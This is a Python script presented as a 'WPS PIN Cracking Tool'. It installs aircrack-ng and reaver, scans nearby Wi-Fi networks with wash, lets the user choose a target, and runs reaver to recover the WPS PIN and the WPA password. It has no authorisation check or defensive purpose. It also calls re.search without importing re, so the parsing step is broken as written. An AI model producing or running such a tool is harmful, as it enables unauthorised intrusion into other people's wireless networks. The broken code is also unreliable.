import os
import subprocess
import sys
import platform
import time

def detect_os():
    """Detect the operating system."""
    system = platform.system().lower()
    if "linux" in system:
        return "linux"
    elif "windows" in system:
        return "windows"
    elif "android" in system:
        return "termux"
    else:
        print("[!] Unsupported operating system.")
        sys.exit(1)

def install_tools(os_type):
    """Install required tools based on the OS."""
    try:
        if os_type == "linux":
            print("[*] Installing tools for Linux...")
            subprocess.run(["sudo", "apt", "update"], check=True)
            subprocess.run(["sudo", "apt", "install", "-y", "aircrack-ng", "reaver"], check=True)
        elif os_type == "termux":
            print("[*] Installing tools for Termux...")
            subprocess.run(["pkg", "update", "-y"], check=True)
            subprocess.run(["pkg", "install", "-y", "aircrack-ng", "reaver"], check=True)
        elif os_type == "windows":
            print("[*] Windows detected. Please install WSL and use Linux tools.")
            print("[*] Alternatively, manually install Aircrack-ng or Reaver on Windows.")
            sys.exit(1)
    except subprocess.CalledProcessError as e:
        print(f"[!] Error installing tools: {e}")
        sys.exit(1)

def scan_wps_networks(os_type):
    """Scan for WPS-enabled networks."""
    try:
        print("[*] Scanning for WPS-enabled networks...")
        if os_type in ["linux", "termux"]:
            result = subprocess.run(["wash", "-i", "wlan0"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            networks = []
            for line in result.stdout.split("\n")[2:]:  # Skip header lines
                if line.strip():
                    parts = line.split()
                    if len(parts) >= 5:
                        bssid = parts[0]
                        channel = parts[1]
                        signal = parts[2]
                        ssid = parts[4]
                        networks.append({"bssid": bssid, "channel": channel, "signal": signal, "ssid": ssid})
            return networks
        else:
            print("[!] WPS scanning is not supported on this platform.")
            return []
    except Exception as e:
        print(f"[!] Error scanning for WPS networks: {e}")
        return []

def crack_wps_pin(os_type, bssid, channel):
    """Attempt to crack the WPS PIN using reaver."""
    try:
        print(f"[*] Attempting to crack WPS PIN for BSSID: {bssid} on channel: {channel}")
        if os_type in ["linux", "termux"]:
            result = subprocess.run(
                ["reaver", "-i", "wlan0", "-b", bssid, "-c", channel, "-vv"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            if "WPS PIN: '" in result.stdout:
                pin_match = re.search(r"WPS PIN:\s+'(\d+)'", result.stdout)
                key_match = re.search(r"WPA PSK:\s+'(.+)'", result.stdout)
                if pin_match and key_match:
                    print(f"[✔] Successfully cracked WPS PIN: {pin_match.group(1)}")
                    print(f"[✔] WiFi Password: {key_match.group(1)}")
                    return True
            return False
        else:
            print("[!] WPS PIN cracking is not supported on this platform.")
            return False
    except Exception as e:
        print(f"[!] Error cracking WPS PIN: {e}")
        return False

def main():
    print("[*] Starting WPS PIN Cracking Tool...")
    
    # Step 1: Detect OS
    os_type = detect_os()
    print(f"[*] Detected OS: {os_type.capitalize()}")
    
    # Step 2: Install tools
    install_tools(os_type)
    
    # Step 3: Scan for WPS-enabled networks
    networks = scan_wps_networks(os_type)
    if not networks:
        print("[!] No WPS-enabled networks found.")
        sys.exit(1)
    
    print("\nAvailable WPS Networks:")
    for i, network in enumerate(networks):
        print(f"{i+1}. SSID: {network['ssid']}, BSSID: {network['bssid']}, Channel: {network['channel']}")
    
    try:
        choice = int(input("\nSelect a network (number): ")) - 1
        if choice < 0 or choice >= len(networks):
            print("[!] Invalid choice.")
            sys.exit(1)
    except ValueError:
        print("[!] Please enter a valid number.")
        sys.exit(1)
    
    selected_network = networks[choice]
    print(f"\n[*] Selected Network: {selected_network['ssid']} ({selected_network['bssid']})")
    
    # Step 4: Crack WPS PIN
    if crack_wps_pin(os_type, selected_network["bssid"], selected_network["channel"]):
        print("[✔] WPS PIN cracking completed successfully.")
    else:
        print("[!] Failed to crack WPS PIN.")

if __name__ == "__main__":
    main()